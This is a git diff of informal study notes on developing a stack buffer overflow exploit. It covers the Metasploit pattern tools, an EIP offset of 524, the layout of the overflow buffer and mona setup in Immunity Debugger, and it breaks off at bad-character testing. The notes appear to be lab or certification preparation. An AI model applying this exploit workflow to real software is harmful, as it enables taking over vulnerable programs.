@@ -39,13 +39,13 @@ Part 3
    
 
 2) creating offset value. with msf 
-   > msf-pattern_create -l 3000
-   where 3000 is Crash byte of the program
+   > /usr/bin/msf-pattern_create -l 3000
+   where 3000 is Crash byte of the program when send Note Down the eip (Make sure to verify once again by restarting the immunity and this time send 'A'*crashbyte and 'B'*4 after the crashing   again you'll be able to see the 42424242 in EIP  )
  
    After getting the crash byte we have to control the intruction pointer
    to do this we'll use the msf venome 
 
-3) msf-pattern_offset -l 3000 -q 35724134 (this is value of eip)
+3) /usr/bin/msf-pattern_offset -l 3000 -q 35724134 (this is value of eip)
 
     output- [*] Exact match at offset 524 
 
@@ -53,11 +53,11 @@ Part 3
 4) after getting the offset value wee need to perform the overflow with some 
    more thing 
    now we have offset=524
-   eip="B" * 4 (this will always contain the eip )
+   eip="B" * 4 (this will always contain the eip address after crashing the program as 42424242 whic is hex of B )
    shellcode= "C"* 400 (this is the space where the stack in buffer fill with  shell code )
 
 5) Creating the working dir in im-debug
-   !mona config -set workingfolder c:\logs\%p
+     !mona config -set workingfolder c:\logs\%p
 
  Now next is to finding the bad char with the help of all possible hex
 
